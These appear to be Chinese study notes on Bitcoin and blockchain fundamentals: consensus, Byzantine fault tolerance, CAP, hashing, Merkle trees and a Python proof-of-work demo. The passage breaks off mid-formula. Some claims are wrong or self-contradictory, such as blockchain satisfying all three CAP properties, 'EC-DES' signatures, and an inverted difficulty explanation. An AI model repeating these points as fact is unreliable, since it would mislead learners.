通常情况下，两者都能提供很好的匿名性 。 但都无法防御有意的追踪 持平   交易 对纸币来说，谁持有纸币谁就是合法拥有者，交易通过纸币自身的转移即可完成，无法复制 。 对数字货币来说则复杂得多，因为任何数字物品都是可以被复制的，但数字 形式也意味着转移成本会更低 。 总体上看，两者适用不同的情景 持平   资源 通常情况下，纸币的生产成本要远低于面额。 数字货币消耗资源的计算则复杂得多 。 以比特币为例，最坏情况下可能需要消耗接近甚至超过面值的电能 持平   发行 纸币的发行需要第三方机构的参与，数字货币则通过分布式算法来完成发行。 在人类历史上，通胀和通缩往往是不合理地发行货币造成的，而数字货币尚缺乏大规模验证， 还有待观察 持平   管理 纸币发行和回收往往通过统一机构，易于监管和审计；目前出现的数字货币在这方面 还缺乏足够支持和验证 纸币    双重支付攻击 对于数字货币来说，数字化内容容易被复制。数字货币持有人可以将同一份货币发给多个接收者，这种攻击称为“双重支付攻击”。\n数字货币1.0：即银行中通过电子账号里面的数字记录了客户的资产\n但他依赖于一个前提：假定存在一个安全可靠的第三方记账机构负责记账，这个机构负责所有的担保环节，最终完成交易。\n银行、支付宝都属于这种类型。\n去中心化的技术难关  货币的防伪：谁负责对货币的真伪进行鉴定 货币的交易：如何确保货币从一方安全转移到另外一方 避免双重支付：如何避免同一份货币支付给多个接收者  数字货币的定义 数字货币可以认为是一种基于节点网络和数字加密算法的虚拟货币。数字货币的核心特征主要体现在三个方面：\n①由于来自于某些开放的算法，数字货币没有发行主体，因此没有任何人或机构能够控制它的发行；\n②由于算法解的数量确定，所以数字货币的总量固定，这从根本上消除了虚拟货币滥发导致的可能；\n③由于交易过程需要网络中的各个节点的认可，因此数字货币的交易过程足够安全 。\n数字货币是一种不受管制的、数字化的货币，通常由开发者发行和管理，被特定虚拟社区的成员所接受和使用。欧洲银行业管理局将虚拟货币定义为：价值的数字化表示，不由央行或当局发行，也不与法币挂钩，但由于被公众所接受，所以可作为支付手段，也可以电子形式转移、存储或交易\n比特币的诞生 2008 年 10 月 31 日， 一位化名 Satoshi Nakamoto （中本聪）的人在 metzdowd 密码学邮件列表中提出了比特币（ Bitcoin）的设计白皮书《 Bitcoin: A Peer-to-Peer Electronic Cash System 》，并在2009 年公开了最初的实现代码 。\n比特币的意义和价值 比特币首次真正从实践意义上实现了安全可靠的去中心化数字货币机制 ，这也是它受到无数金融科技从业者热捧的根本原因 。\n 作为一种概念货币，比特币主要希望解决已有货币系统面临的几个核心问题：  被掌控在单一机构手中，容易被攻击 自身的价值无法保证，容易出现波动 无法匿名化交易，不够隐私    比特币的生态系统如下： 区块链因比特币而生，但是现在已经脱离了比特币网络自身。\nBlock Chain 区块链本质上是一个去中心化的数据库，又不仅仅是一个数据库。是一串使用密码学方法相关联产生的数据块，每一个数据块中包含了一组比特币网络交易的信息，用于验证其信息的有效性(防伪)和生成下一个区块。\n2015年被业界视为区块链元年，2016年则是区块链产业深化发展和全面加速前行的一年，2019年为“上链元年”。\n 区块链的特点  分布式容错性：分布式网络及其鲁棒，能够容忍部分节点的异常状态 不可篡改性：一致提交后的数据会一直存在，不可销毁和修改 隐私保护性：密码学保证了数据隐私，即便数据泄露也无法解析   随之带来的业务特性  可信任性：区块链技术可以提供天然可信的分布式账本平台，不需要额外的第三方中介机构参与 降低成本：跟传统技术相比，区块链技术可能需要时间、人力和维护成本更少 增强安全：区块链技术将有利于安全、可靠的审计管理和账目清算，减少犯罪风险    所有跟信息、价值、信用等相关的交换过程，都将可能从区块链技术中得到启发或直接受益。\nWikipedia的定义：是借由密码学串接并保护内容的串连文字记录。类比于一种分布式数据库技术，通过维护数据块的链式结构，可以维持持续增长的、不可篡改的数据记录。\n区块链技术最早的应用出现在比特币项目中。\n基本概念：\n 交易（transaction）：一次对账本的操作，导致账本状态的一次改变，如添加一条转账记录 区块（block）：记录一段时间内发生的所有交易和状态结果，是对当前账本状态的一次共识 链（chain）：由区块按照发生顺序串联而成，是整个账本状态变化的日志记录  若把区块链作为一个状态机，则每一次交易是视图改变一次状态，而每次共识生成的区块，就是参与者对于区块中交易导致状态的改变的结果进行确认。\n在实现上，首先假设存在一个分布式的数据记录账本，这个账本只允许添加 、 不允许删除 。 账本底层的基本结构是一个线性的链表，这也是其名字“区块链”的来源 。\n链表由一个个“区块”串联组成，后继区块记录前导区块的哈希值（ pre hash ） 。 新的数据要加入，必须放到一个新的区块中 。 而这个块（以及块里的交易）是否合法，可以通过计算哈希值的方式快速检验出来 。 任意维护节点都可以提议一个新的合法区块，然而必须经过一定的共识机制来对最终选择的区块达成一致。\n  比特币为例，区块链的共组过程    比特币客户端发起一项交易，广播到比特币网络中并等待确认 。\n  网络中的节点会将一些收到的等待确认的交易记录打包在一起（此外还要包括前一个区块头部的哈希值等信息），组成一个候选区块 。\n  试图找到一随机串放到区块里，使得候选区块的哈希结果满足一定条件（比如小于某个值） 。 这个 nonce 串的查找需要一定的时间去进行计算尝试。\n  一旦节点算出来满足条件的 nonce 串，这个区块在格式上就被认为是“合法”了，就可以尝试在网络中将它广播出去 。\n  其他节点收到候选区块，进行验证，发现确实符合约定条件了，就承认这个区块是一个合法的新区块，并添加到自己维护的区块链上 。\n  当大部分节点都将区块添加到自己维护的区块链结构上时，该区块被网络接受，区块中所包括的交易也就得到确认 。\n   如图，A想要向B发起交易（1，2），做工作量证明，然后将交易广播至区块链网络中（3），让其他节点验证工作量证明（4），验证成功后，将交易区块加入该链的末尾（5），交易成功（6）。\n工作量证明 Proof of Work：简称PoW，即工作量证明。比特币的这种基于算力寻找 nonce 串的共识机制。 目前，要让哈希结果满足一定条件，并无已知的快速启发式算法，只能进行尝试性的暴力计算 。 尝试的次数越多（工作量越大），算出来的概率越大 。\n通过调节对哈希结果的限制，比特币网络控制平均约 10 分钟产生一个合法区块 。 算出区块的节点将得到区块中所有交易的管理费和协议固定发放的奖励费（目前是 12.5 比特币，每四年减半），这个计算新区块的过程俗称为挖矿 。\n比特币网络中存在大量（据估计数千个）的维护节点，而且大部分节点都是正常工作的，默认都只承认所看到的最长的链结构 。 只要网络中不存在超过一半的节点提前勾结一起采取恶意行动，则最长的链将很大概率上成为最终合法的链 。 而且随着时间增加，这个概率会越来越大。 例如，经过 6 个区块生成后，即便有一半的节点联合起来想颠覆被的结果，其概率也仅为（1/2)6 = 1.6% ，即低于 1 /60 的可能性 。当然，如果整个网络中大多数的节点都联合起来作恶，可以导致整个系统无法正常工作 。 要做到这一点，往往意味着付出很大的代价，跟通过作恶得到的收益相比，得不偿失 。\n区块链的演化   区块链1.0\n​\t区块链1.0是随着比特币的发明而引入，基于用于加密货币\n  区块链2.0\n​\t主要用于金融服务，在这一阶段引入合同\n  区块链3.0\n​\t用于金融服务行业之外，同时还包括政府、卫生、媒体、艺术和司法等更综合的行业\n  Generation X（区块链X）\n​\t这是区块链发展过程中一个奇点，有一天我们将会拥有一个公共区块链服务，任何人都可以使用，进而在所有领域提供服务\n  三种典型演化场景\n   场景 功能 智能合约 一致性 权限 类型 性能 编程语言 代表     公信的数字货币 记账功能 不带有或较弱 Pow 无 公有链 较低 简单脚本 比特币网络   公信的交易处理 智能合约 图灵完备 PoW、PoS 无 公有链 受限 待定语言 以太坊网络   带权限的分布式账本处理 商业处理 多种语言、图灵完备 包CFT、BFT在内的多种机制、可插拔 支持 联盟链 可扩展 高级编程语言 超级账本    演化出的几种类型：\n  公有区块链：对公众开放，任何人都可以作为节点参与进来。任何人不会持有该账本，而且向任何参与者开放 私有区块链：仅向特定组织开放，进而确定账本的共享过程 半私有区块链：兼具私有性和公有性，私有部分由某一团体控制，而公有部分则向参与者开放 侧链技术：包括单路楔入式侧链和双路楔入式侧链。针对后者，货币可在主链和侧链间移动，并在必要时返回至主链 许可账本：参与者是已知且受信的，许可账本不需要使用分布式协商一致机制，相反，可以使用一致性协议来维护共享账本 分布式账本：分布式账本分布在参与者之间，并扩散于多个站点或组织中。对应的记录是连续存储的，而不是按情况排序的 共享账本：共享的应用程序和数据库 全私有和专有账本：适用于组织内部的特定私有环境共享数据，并提供数据的真实性保证 标记化区块链：标准的区块链，通过挖掘和初始分布来生成加密货币 无代币区块链：不需在节点间传递值，只需在受信各方之间共享数据   区块链是首个自带对账功能的数字记账技术实现 跟传统的记账技术相比，基于区块链的分布式账本应该包括如下特点：\n  维护一条不断增长的链，只可能添加记录，而发生过的记录都不可篡改\n  去中心化，或者说多中心化，无需集中控制而能达成共识，实现上尽量采用分布式\n  通过密码学的机制来确保交易无法被抵赖和破坏，并尽量保护用户信息和记录的隐私性\n  分类 根据参与者的不同，可以分为公开（public）链、联盟（ consortium）链和私有（private）链。\n 公有链，顾名思义，任何人都可以参与使用和维护，如比特币区块链，信息是完全公开的；  如果进一步引入许可机制，可以实现私有链和联盟链两种类型：\n  私有链，由集中管理者进行管理限制，只有内部少数人可以使用，信息不公开；\n  联盟链则介于两者之间，由若干组织一起合作维护一条区块链，该区块链的使用必须是带有权限的限制访问，相关信息会得到保护，如供应链机构或银行联盟 。\n  分布式系统与去中心化 分布式系统   区块链的核心是一个去中心化的分布式系统\n  分布式系统中的节点可以相互交换信息\n  节点分为可信节点、缺陷节点、恶意节点。一个由任意行为的节点被称为拜占庭节点，网络上某个出现任何意外行为的节点都可归类于拜占庭节点。\n  分布式系统的主要挑战：节点与容错的协调，即一个节点的失效不影响整个系统的运行\n  同步系统：Synchronous System: Known bounds on times for message transmission, processing , bounds on local clock drifts, etc.(Can use timeout)\n  异步系统：Asynchronous System: No known bounds on times for message transmission, processing, bounds on local clock drifts, etc.(More realistic, practical, but no timeout.)\n  CAP定理 cap定理，又称布鲁尔定理：任意分布式系统不能同时拥有一致性、可用性、分区容错性\n 一致性(Consistency)：任意节点拥有最新数据副本 可用性(Availablitiy)：系统在使用期间可以被访问，接收请求并在必要时做出响应 分区容错性(Partition Tolerance)：一组节点的失效不影响系统的运行  一般是淘宝的系统可用性可以达到5个9，意思是他的可用水平是99.999%，即全年停机时间不超过(1-0.99999)*365*24*60 = 5.256min\n**CP without A **：一旦发生网络故障或者消息丢失等情况，就要牺牲用户的体验，等待所有数据全部一致了之后再让用户访问系统。分布式存储系统(Redis、Hbase),分布式协调组件Zookeeper.\nAP wihtout C：要高可用并允许分区，则需放弃一致性。一旦网络问题发生，节点之间可能会失去联系。为了保证高可用，需要在用户访问时可以马上得到返回，则每个节点只能用本地数据提供服务，而这样会导致全局数据的不一致性。\n淘宝的购物，12306的买票，都是在可用性和一致性之间舍弃了可用性而选择一致性。保证了最终一致性。\n然而区块链可以实现这三种属性\n 通过复制的方式实现容错性\n通过一致性算法确保所有节点具有相同的数据\n 拜占庭将军问题 一群领导拜占庭各部军队的陆军将军，计划从某一城市进攻或撤退。这里，将军们之间的唯一沟通方式是信使，他们需要就同时进攻达成一致意见，以赢得胜利。\n**问题：**一名或多名将军或许是叛徒，可以传达一个误导信息。因此，有必要找到一种可行的机制，让将军们之间达成某种协议，这样就可以同时进行攻击。\n相较于分布式系统，将军可视作节点，叛国者则视作拜占庭（恶意的）节点，信使是将军之间沟通的渠道。\n拜占庭将军失效 所谓拜占庭失效指一方向另一方发送消息，另一方没有收到，或者收到了错误的信息的情形。\n在容错的分布式计算中，拜占庭失效可以是分布式系统中算法执行过程中的任意一个错误。这些错误被统称为“崩溃失效”和“发送与遗漏式失效”。当拜占庭失效发生时，系统可能会做出任何不可预料的反应。\n这些任意的失效可以粗略地分成以下几类：\n   进行算法的另一步时失效，即崩溃失效；\n  无法正确执行算法的一个步骤；\n  执行了任意一个非算法指定的步骤。\n   各个步骤由各进程执行，算法就是由这些进程执行的。一个错误的进程是在某个点出现了上述情况的进程。没有出现错误的进程是正确的进程。\n拜占庭将军问题——解决算法 拜占庭问题的最初描述是：n 个将军被分隔在不同的地方，忠诚的将军希望通过某种协议达成某个命令的一致（比如一起进攻或者一起后退）。但其中一些背叛的将军会通过发送错误的消息阻挠忠诚的将军达成命令上的一致。Lamport 证明了在将军总数大于3m ，背叛者为m 或者更少时，忠诚的将军可以达成命令上的一致。\n 为了保证上面的需求，必须满足下面两个条件：  IC1. 所有忠诚的副官遵守相同的命令，即一致性 IC2. 如果发出命令的将军是忠诚的，那么所有忠诚的副官遵守司令（发出命令的将军）的命令，即正确性     特别提示：\n发送命令的每次只有一个将军，将其命令发送给n-1 个副官。\nm 代表叛国者的个数，因为将军总数为n，所以副官总数为n-1 个。\nIC2 中副官遵守实际上是指忠诚的将军能够正确收到忠诚将军的命令消息。\n 消息传递  通过消息传递达到一致，如果有m 个叛国将军，则将军们的总数必须为3m+1 个以上。下面是消息传递过程中默认的一些条件：  A1. 每个被发送的消息都能够被正确的投递 A2. 信息接收者知道是谁发送的消息 A3. 能够知道缺少的消息    A1 和 A2 假设了两个将军之间通信没有干扰，既不会有背叛者阻碍消息的发送（截断）也不会有背叛者伪造消息的情况（伪造）。即是每个将军都可以无误地将自己的消息发送给其他每个将军。\n算法  拜占庭将军问题。口头算法OM(n.m);n=3m+1\n OM(m)算法：\n消息算法OM(m) 。对于所有的非负整数m ，每个发令者通过OM(M) 算法发送命令给n-1 个副官。 # 将军通过副官传递消息:即, 消息传递路线: 将军i--Message--\u003e副官i --boardcast--\u003e副官j--Message--\u003e将军j （1）发令者将他的命令发送给每个副官。 （2）对于每个i ，vi 是每个副官i 从发令者收到的命令，如果没有收到命令则为撤退命令。副官i 在OM(m-1) 中作为发令者将vi 发送给另外n-2 个副官。 （3）对于每个i，并且j 不等于 i，vj 是副官i 从第（2）步中的副官j 发送过来的命令（使用 OM(m-1)算法），如果没有收到第（2）步中的副官j 的命令则默认为撤退命令。最后副官i 使用majority(v1,…,vn-1)得到命令。 定义majority(cmd1,cmd2,…,cmdn)等于多数派命令。 第一轮将军发给所有副官命令 第二轮n-1副官互通将军发了什么,确定将军是否为叛徒,若将军是叛徒，则将军的消息无效,舍弃;将军忠诚,即可在第二轮已可决定 第三轮n-1副官互通某个副官各给别人发了什么消息,遍历n-2个副官的消息以判断自己作何决定 (例:若L1收到其它L2~L6发来的Vj, 但是他要怀疑准确性，比如L1会想L2发给自己是否是正确的呢？那么就进入第三轮进行投票.因此跟在第2轮之后,L1会依次询问L3,4,5,6 ，问他们上一轮L2给他们发了什么,L1得到第二轮中L2-\u003eL3,L2-\u003eL4,L2-\u003eL5,L2-L6,再结合L2-\u003eL1，从5个里用majority函数决定L2发了啥，再依次遍历L3-6,然后L1完成第二轮的确认) 算法证明 详细的算法证明可参考：\n 拜占庭将军百度百科\n如何理解拜占庭将军问题\n 定理1：对于任意m，如果有超过3m 个将军和最多m 个背叛者，算法OM(m) 满足条件IC1 和条件IC2。\n引理1：对于任意m 和k ，如果有超过2k+m 个将军和最多k 个背叛者，那么算法OM(m) 满足IC2 （回顾下IC2 指的是，如果将军是忠诚的，所有的副官遵守将军命令）。\n签名消息 签名消息在除了满足口头消息A1-A3 三点要求外还应该满足下面A4：\n  A4.\n （a）签名不可被伪造，一旦被篡改即可发现 （b）任何人都可以验证将军签名的可靠性    choice() 来决定副官的选择：\n  当集合V 只包含了一个元素v ，那么choice(V)=v ；\n  choice(Φ)=RETREAT。\n  基于签名消息的算法 SM(m)算法：\n初始化Vi=空集合 （1）将军签署命令并发给每个副官 （2）对于每个副官i ： （A）如果副官i 从发令者收到v:0 的消息，且还没有收到其他命令序列，那么： （i）使Vi 为{v} （ii）发送v:0:i 给其他所有副官 （B）如果副官i 收到消息v:0:j1:...:jk 且v 不在集合Vi 中则 （i）添加v 到Vi （ii）如果k\u003cm ，那么发送v:0:j1:...:jk:i 给每个不在j1,..,jk 中的副官 （3）对于每个副官i ，当不再收到消息，则遵守命令choice(Vi) 基于签名消息的算法证明 定理2：对于任意m，最多只有m 个背叛者情况下，算法SM(m) 解决拜占庭将军问题。\n区块链与分布式系统  区块链的核心是一个点对点的分布式账本，此类账本具有加密安全性，且仅可追加内容，同时不可更改（很难），只有在对等身份成员之间达成共识或协议时才能更新 区块链可以定义为一个平台，在此平台上，对等点可以通过交易交换值，而不需要中央信任仲裁者。  一致性 一致性是指不信任节点之间的协议过程。\n 一致性机制所需满足的需求：\n 协议：全部可信节点制定同一值 有效性：所有可信节点的商定值必须与至少一个节点所提议的初始值相同 容错性：一致性算法应在能出现故障或恶意节点的情况下运行 完整性：任何节点都不可能做多次决策   一致性机制的类型：\n 基于拜占庭式的容错：不存在计算密集型操作，依赖于一个简单的、发布签名消息的节点方案 基于领导的一致性机制：节点实现领导选举机制，由获胜节点提供结果值  区块链的一般元素  地址：表示事务中收件人和发件人的唯一标识符，通常表示为公钥或派生自私钥。建议在每个事务中用新生成的地址，防止将交易链接到公共所有者，避免身份识别 事务：区块链的基本单元，表示地址间的值传输 区块：由多个交易和其他元素组成 P2P网络：所有对等点之间的可以彼此通信、发送和接收消息 脚本或程序语言：交易脚本是节点的预定义集合，用于将令牌从一个地址转移到另一个地址，并执行各种其他功能 虚拟机：事务脚本的扩展，可运行图灵完备的代码 状态机：一个区块链可以看作一个状态转换机制 节点：可以生成并验证交易，同时进行挖掘。根据区块链类型及节点分配的角色，还可以执行其他功能 智能合约：智能合约运行于区块链之上，在满足某些条件时封装业务。区块链并不支持智能合约  区块链的特性  **分布式一致性：**缺少中心信任机制授权的情况下，各方都能达成一致 **交易验证：**节点发布交易基于预先确定的规则进行验证，有效的交易才能包含在区块中 **智能合约平台：**区块链定义为一个平台，程序可以运行其上，并代表用户执行业务逻辑 **在对等点间传输值：**允许通过令牌在用户之间传递值，令牌是值的载体 **生成加密货币：**是一个可选的特性，为的是激励矿商 **智能属性：**采用不可撤销的方式将资产与区块链联系起来，使任何人都无权占有、资产完全由个人控制、不可重复使用或双重拥有 **安全提供商：**基于已证实的加密技术，确保数据的完整性和可用性 **不变性：**区块链中的记录是不可变的 **唯一性：**每个交易都是唯一的，且尚未被消费 **智能合约：**区块链提供了一个有智能合约特性的平台，可视为区块链上的自主程序，可以封装业务逻辑和代码，以便下一步所需。智能合约同时实现了灵活性、可编程性、对于特定业务执行的特定操作，区块链用户可对此加以控制  区块链中的共识   工作量证明机制（PoW）\n依赖于：在提出一个网络接受价值之前已经花费饿了足够的计算资源。用于比特币和其他加密货币。\n  权益证明(PoS)\n理念：节点或用户在系统中具有足够的权益。如用户在系统中投入了足够的资金，因此，恶意行为获得的收益将超出执行系统攻击。应用于以太坊区块链中，生成并签订下一个区块的机会随着币龄而增加。\n  委托权益证明(DPoS)\n对PoS的一种创新，每个节点都可以通过投票将交易的验证委托给其他节点。应用于比特股中。\n  流逝时间证明\n使用可信执行环境（TEE）通过可靠的等待时间再领导选举过程中提供随机性和安全性。\n  基于保证金的共识\n希望加入网络的节点在生成区块链之前存入保证金。\n  重要性证明\n依赖于用户在系统中所拥有的权益份额，并监视用户对令牌的使用和移动，以建立信任和重要性级别。\n  联邦共识和联邦拜占庭共识\n应用于恒星共识协议中，保留一组公开信任的对等点，并只传播由大多数受信节点验证的交易。\n  信誉机制\n基于在网络上建立的声誉选择领导者，由其他成员投票实现。\n  实用拜占庭容错机制(PBFT)\n实现了状态机的复制，并对拜占庭节点提供了容错机制。\n  基于区块链的去中心化  **分布式系统：**数据和计算是分布在多个节点上，计算不可能以并行方式执行，数据仅可在用户视为单一聚合系统的多个节点上进行复制。\n**并行系统：**计算是由所有节点同步执行。\n  分布式系统：存在管理整个系统的中央权威机构，控制权分布在许多节点中。\n**去中心化系统：**是节点不依赖与单个主节点的网络类型，且不存在中央权威机构。\n 去中心化方法 存在两种方法实现去中心化：非中介化和竞争\n非中介化：不通过中介机构进行相应的活动，或消除中间人或中介机构，如C2C模式；不通过银行转账，而用区块链地址进行直接转账\n竞争：一组服务提供者相互竞争，以便被系统选择进而提供有效服务。在区块链系统中，智能合约可以根据声誉、评分、评论和服务质量，从大量的提供者中选择一个外部的数据提供者。当然这并不是完全的去中心化，但允许智能合约根据标准作出自由选择\n去中心化流程 不是所有的事务都需要去中心化的\n 去中心化需求条件评估：\n  去中心化的含义\n去中心化系统可以是任何系统\n  去中心化所需的级别\n  可以是完全中介化或部分中介化\n  采用哪种区块链\n可以选择比特币、以太坊等\n  采用哪种安全性机制\n原子性机制，确保系统的完整性；声誉机制，支持系统中不同的受信度\n   区块链和完整的生态圈去中心化操作 去中心化的生态系统概览如下：\n存储 数据可以直接存储在区块链中，即实现了去中心化操作，但存在一个缺点：区块链不适合存储大量的数据，如图像。\n去中心化存储方案：\n  **分布式哈希表（DHT）：**应用于BitTorrent，用户不会无限期的保存相关文件，如果节点脱离网络，则节点无法被检索到，除非该节点再次加入到网络，以使文件再次可用。\n  **Inter Planetary File System（IPFS）**拥有高可用性和链接稳定性，旨在通过替换HTTP协议提供一个去中心化的万维网。使用Kademlia DHT和merkle DAG（有向无环图）分别提供存储和搜索功能。\n  激励机制基于Filecoin协议，该协议向使用BitSwap机制存储数据的节点提供激励。 BitSwap机制允许节点保留一个简单的字节账本。\n  Ethereum包含自身的去中心化和分布式的生态系统，并使用集群存储和whisper协议进行通信。\n  Maidsafe致力于提供一个去中心化的万维网。\n  BigChainDB目的是提供一个可伸缩、快速和线性和伸缩的去中心化数据库，而不是传统的文件系统。\n  通信 去中心化网络方案：\n  Internet旨在建立一个去中心化的系统。该模型基于中央权威（服务提供者）的信任，用户并不负责管理其数据，甚至密码也可存储在受信的第三方系统上。有必要以某种方式向个别用户提供管理权限，确保用户可以访问数据，并且不依赖于第三方。（如IPFS）\n  **网状网络：**节点间可以直接对话，而不需要像服务提供商那样采用中心枢纽。例如Firechat，允许iphone用户在没有互联网的情况下以点对点的方式直接进行通信。\n  密码学与基本技术 区块链的不可篡改性基于密码学的算法实现\n  密码学发展简史   密码学数学基础   对称密码机制   非对称密码机制   Hash技术 哈希函数用于创建任意长度的输入字符串、固定长度的文摘，所以常用于数字签名和消息认证码中。\n SHA256：输入消息大小小于264位。其中，块大小为512位，字大小为32位，输出为256位的文摘。\n 预处理算法：  a) 如果小于512位块尺寸，填充为512位块尺寸。\nb) 将消息解析为消息块，确保消息及其填充内容划分为512位的相等快。\nc) 设置初始哈希值，表示为8个32位的字，是前8个素数的平方根小数的前32位。\n 哈希计算步骤：  a) 每个消息块依次进行处理，需要64轮才能计算出全部哈希结果。其中，每一轮使用不同的常数，以确保没有两轮处于等同状态。\nb) 设置消息轮询。\nc) 初始化8个工作变量。\nd) 计算中间哈希值。\ne) 处理消息并生成输出哈希值。\n   ​ 在p2p网络下载网络之前，先从可信的源获得文件的Merkle Tree树根。一旦获得了树根，就可以从其他不可信的源获取Merkle tree。通过可信的树根来检查接受到的Merkle Tree。如果Merkle Tree是损坏的或者虚假的，就从其他源获得另一个Merkle Tree，直到获得一个与可信树根匹配的Merkle Tree。\n  特点：\n MT大多数是二叉树，也可以多叉树，具有树结构的所有特点 叶子节点的value是数据集合的单元数据或者单元数据HASH 非叶子节点的value是根据它下面所有的叶子节点值，然后按照Hash算法计算而得出的    优点：可以直接下载并立即验证Merkle Tree的一个分支。因为可以将文件切分成小的数据块，这样如果有一块数据损坏，仅仅重新下载这个数据块就行了。\n  基本密码技术的应用   EC-DH交换密钥\nEC-DES签名\n共识算法  可参考：\n[区块链] 共识算法之争(PBFT，Raft，PoW，PoS，DPoS，Ripple)\n深入浅出PBFT算法原理\n 共识机制 区块链的底层由四部分构成\n 分布式数据库：用来存储以往和将来的交易数据 密码学：公钥私钥体系用来确认交易双方的身份 P2P网络：用来广播和蔓延各类消息（如节点的加入消息、节点失效消息、得到挖矿数据的消息） 共识机制：用来决定节点记账权利  区块链系统的核心是系统节点竞争记账，这个竞争过程称为共识机制\n共识机制在区块链中扮演着核心地位，共识机制决定了谁有记账的权利，以及记账权利的选择过程和理由\n 共识机制：区块链事务达成分布式共识的算法  不同的虚拟货币采用不同的共识机制，常见的共识机制如POW、POS、DPOS、PBFT等\nPoW POW：Proof of work，工作量证明机制\nPOW工作量证明就是我们所熟悉的挖矿，通过与或运算，计算出一个满足规则的随机数，即获得本次记账权，发出本轮所需要记录的数据，全网其他节点验证后一起存储。这种证明方式的一个显著特征是往往需要很大的工作量才能拿到指定成果，但是这个成果很容易验证\nPOW工作量证明的三要素：①工作量证明函数\t②Merkle树\t③难度值\n①工作量证明函数 1.输入x可以是任意长度的字符串 2.输出结果即H(x)的长度是固定的 3.计算H(x)的过程是高效的   免碰撞   函数还需要免碰撞，即不会出现 x ≠ y ，但是 H(x)=H(y)。但是这个特点在理论上并不成立，对于SHA256算法，会有2^256种输出，进行2^256+1次输出，那么根据鸽巢原理，一定会产生一次碰撞。\n但是从概率的角度看，随机生成K个数，他们不同的概率为 (N-1)/N × (N-2)/N × …… × (N-(k-2) )/N × (N-(k-1))/N = e-k(k-1)/2N\n因此，碰撞的概率为 1-e-k(k-1)/2N\n因此，从概率的角度看，sha256进行2^130次输入就会有99%的可能发生一次碰撞\n不过，假设一台计算机以每秒10000次的速度进行哈希运算，要经过10^27年才能完成2^128次hash运算\n如图为不同位发生hash碰撞的可能性，最右边是发生hash碰撞的可能性，左边是经过多少个数之后可能达到发生的可能性。\n  隐匿性   对于一个给定的输出结果H(x)，想要逆推出输入x，在计算上是不可能的。\n不存在比穷举更好的方法，可以使哈希结果H(x)落在特定范围。\nBlock Hash = hash(本页内容，Pre Hash，时间戳)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53  \u003e\u003e\u003e import hashlib \u003e\u003e\u003e import re \u003e\u003e\u003e def s256(text): ... c = hashlib.sha256(text.encode('utf-8')) ... return text, c.hexdigest() ... \u003e\u003e\u003e s256('hacking') ('hacking','42d83a899f20aea7d53614d163ac6e90cf4143919324cee410dd767cf6225bbf') \u003e\u003e\u003e def cal(t, flag): ... pj = 0 ... ans = None ... while not None: ... s = t + str(pj) ... ans = re.match(flag, s256(s)[1]) ... if ans is None: ... print(pj) ... pj+=1 ... else: ... print(s256(s)) ... break \u003e\u003e\u003e \u003e\u003e\u003e \u003e\u003e\u003e flag = \"0{0}[a-f0-9]{64}\" \u003e\u003e\u003e cal(\"fuck\",flag) ('fuck0', '2096b072b572e7b3554ab62b542dee4136e4b3a0243be126918d035ec4a4a727') \u003e\u003e\u003e flag = \"0{1}[a-f0-9]{63}\" \u003e\u003e\u003e cal(\"fuck\",flag) ...... ('fuck10', '03fc6bfae9f00fa966431f707507d7a18e201d81d564dba42b96b2a7988f3ca6') \u003e\u003e\u003e flag = \"0{2}[a-f0-9]{62}\" \u003e\u003e\u003e cal(\"fuck\",flag) ...... ('fuck448','00ff7469c5332f8f5957f0acb1448d00fa4b2e281065f9202ea549a3a6ff7dba') \u003e\u003e\u003e flag = \"0{3}[a-f0-9]{61}\" \u003e\u003e\u003e cal(\"fuck\",flag) ...... ('fuck7703', '0006086f65ce49afbd0479d1094463db1c7385aa1c1cd1ffedc1399404ee4fc9') \u003e\u003e\u003e flag = \"0{4}[a-f0-9]{60}\" \u003e\u003e\u003e cal(\"fuck\",flag) ...... ('fuck263273', '000069e2e17d677804f76fb9b79b8f9d7654563a91a77a7d6c75ae30c6963e90') \u003e\u003e\u003e flag = \"0{5}[a-f0-9]{59}\" \u003e\u003e\u003e cal(\"fuck\",flag) ...... ('fuck271481', '00000fa9aeacc3e986eaf8b8337d71c67abbd77acfd5cc8b90262f7377fdab7e') \u003e\u003e\u003e flag = \"0{6}[a-f0-9]{58}\" \u003e\u003e\u003e cal(\"fuck\",flag) ...... ('fuck9197297', '000000c91683616ac0e361c2eafc66de0757e9d46f819e86d30d2cdae1df4398') \u003e\u003e\u003e flag = \"0{7}[a-f0-9]{57}\" \u003e\u003e\u003e cal(\"fuck\",flag) ......   ②Merkle树 Merkle树一般用于完整性验证处理。Merkle哈希树是一类基于哈希值的二叉树或多叉树，其子节点上的值通常为数据库的哈希值，而非叶子节点上的值该将该节点的所有子节点的组合结果的哈希值。将Merkle Root存入区块头里，Merkle Tree 存入区块体里。\n节点生成一笔筹币交易，对于4个交易记录L1，L2，L3，L4，分别计算hash(L1)，hash(L2)，hash(L3)，hash(L4)；对于hash0=hash(hash0-0+hash0-1) 和 hash1=hash(hash1-0 + hash1-1)；计算出根节点的hash值top hash，topHash=hash(hash0+hash1)。\n然后将Merkle树root的top hash值存入区块链头中，如下图\n区块链中的Merkle树为二叉树，用于存储交易信息。每个交易两两配对，构成Merkle树的子节点，进而生成整个Merkle树。Merkle树使得用户可以通过从区块头得到的Merkle树根和别的用户所提供的中间哈希值列表去验证某个交易是否包含在区块中。提供中间哈希值的用户并不需要是可信的，因为伪造区块头的代价很高，而中间哈希值如果伪造的话会导致验证失败。\nSPV：简化支付验证（Simplified Payment Verification），轻钱包并不保存完整的区块链，而是只保存每一个区块的区块头。区块体保存了完整的交易信息，而交易信息需要的存储量大部分都是交易头的千倍以上。所以，如果只保存交易头，就可以极大的减少本地客户端存储的区块链信息。\n在交易时，发出一个MerkleBlock消息，包含区块头和一条连接目标交易与Merkle根的Merkle路径\n若需验证该交易，即可通过其Merkle路径与交易hash确定一个新的Merkle Root，将其与原root相比即可。\n 参考：\nMerkle Tree 入门\n密码学——Merkle树\n 假如有交易改变，则整个树枝会发生改变\n定位的时间为O(log(n))，即二叉树的查找时间\n③难度值  新难度值 = 旧难度值 * （20160分钟 / 最近的2016个区块花费的时长）  新难度值解析：撇开就难度值，按比特币理想值情况每10分钟出块的速度，过去2016个块的总花费时间接近20160分钟，这样，这个值永远趋于1。\n若过去2016个区块花费时长少于20160分，那么这个系数会小于1，否则，会大于1。\n难度值越大，越难挖。因为20160分大约为14天，而比特币网络大约14天调整一次难度值。\n比特币的难度和出块速度将成反比例适当调整出块速度。\n目标值 = 最大目标值 / 